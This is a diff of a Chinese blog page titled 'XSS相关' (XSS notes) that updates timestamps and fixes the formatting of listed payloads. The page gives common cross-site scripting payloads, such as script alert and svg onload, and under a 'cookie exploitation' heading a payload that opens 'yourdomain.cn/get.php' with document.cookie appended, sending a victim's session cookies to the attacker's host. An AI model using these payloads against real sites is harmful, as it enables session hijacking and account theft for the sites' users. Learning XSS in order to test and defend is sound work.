@@ -62,7 +62,7 @@
 <meta property="og:site_name" content="Alairs Notepad">
 <meta property="og:description" content="常用的payload：">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-24T08:57:21.946Z">
+<meta property="og:updated_time" content="2019-08-25T14:16:22.865Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS相关">
 <meta name="twitter:description" content="常用的payload：">
@@ -277,11 +277,19 @@
                 
               
 
-              <time title="创建时间：2019-08-24 16:56:46 / 修改时间：16:57:21" itemprop="dateCreated datePublished" datetime="2019-08-24T16:56:46+08:00">2019-08-24</time>
+              <time title="创建时间：2019-08-24 16:56:46" itemprop="dateCreated datePublished" datetime="2019-08-24T16:56:46+08:00">2019-08-24</time>
             </span>
           
             
 
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2019-08-25 22:16:22" itemprop="dateModified" datetime="2019-08-25T22:16:22+08:00">2019-08-25</time>
+              </span>
             
           
             <span class="post-meta-item">
@@ -311,7 +319,7 @@
       
         <h3 id="常用的payload："><a href="#常用的payload：" class="headerlink" title="常用的payload："></a>常用的payload：</h3><a id="more"></a>
 
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;svg/</span>onload=<span class="string">"alert("</span>xss<span class="string">")"</span>&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"xss"</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;svg/</span>onload=alert(<span class="string">"xss"</span>)&gt;</span><br></pre></td></tr></table></figure>
 
 <h3 id="JavaScript事件："><a href="#JavaScript事件：" class="headerlink" title="JavaScript事件："></a>JavaScript事件：</h3><table>
 <thead>
@@ -405,7 +413,7 @@
 <td>用户退出页面</td>
 </tr>
 </tbody></table>
-<h3 id="cookie的利用"><a href="#cookie的利用" class="headerlink" title="cookie的利用"></a>cookie的利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;window.open('http:/</span><span class="regexp">/yourdomain.cn/g</span>et.php?cookie=<span class="string">'+document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="cookie的利用"><a href="#cookie的利用" class="headerlink" title="cookie的利用"></a>cookie的利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;window.open('http:/</span><span class="regexp">/yourdomain.cn/g</span>et.php?cookie=<span class="string">'+document.cookie)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
 
 
     </div>
